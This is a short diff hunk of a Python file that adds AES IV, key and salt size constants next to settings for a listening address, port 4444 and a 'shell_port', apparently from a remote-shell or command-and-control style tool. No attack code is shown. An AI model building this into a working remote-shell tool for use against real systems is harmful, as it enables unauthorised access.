@@ -13,6 +13,10 @@ ip_addr = "0.0.0.0"
 port = 4444
 shell_port = 4666
 
+IV_SIZE = 16    # 128 bit, fixed for the AES algorithm
+KEY_SIZE = 32   # 256 bit meaning AES-256, can also be 128 or 192 bits
+SALT_SIZE = 16  # This size is arbitrary
+
 
 def setup():
     global KEY, ip_addr, port, shell_port
